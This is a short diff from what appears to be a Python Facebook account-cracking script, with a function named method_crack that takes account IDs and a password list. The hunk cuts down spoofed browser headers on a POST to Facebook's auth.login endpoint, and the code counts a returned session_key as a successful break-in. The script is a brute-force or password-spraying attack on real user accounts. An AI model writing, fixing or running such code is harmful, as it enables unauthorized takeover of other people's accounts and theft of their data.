@@ -124,13 +124,7 @@ def method_crack(ids,passlist):
           'sec-fetch-dest': 'empty',
           'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-origin',
-         'user-agent':  pro
-         'viewport-width': '445',
-         'x-asbd-id': '129477',
-         'x-fb-lsd': 'AVpPFkHCtrc',
-         'x-requested-with': 'XMLHttpRequest',
-         'x-response-format': 'JSONStream',
-         'x_fb_background_state': '1',}
+         'user-agent':  pro}
             url='https://api.facebook.com/method/auth.login'
             reqx=requests.post(url,data=datax,headers=header).json()
             if 'session_key' in reqx:
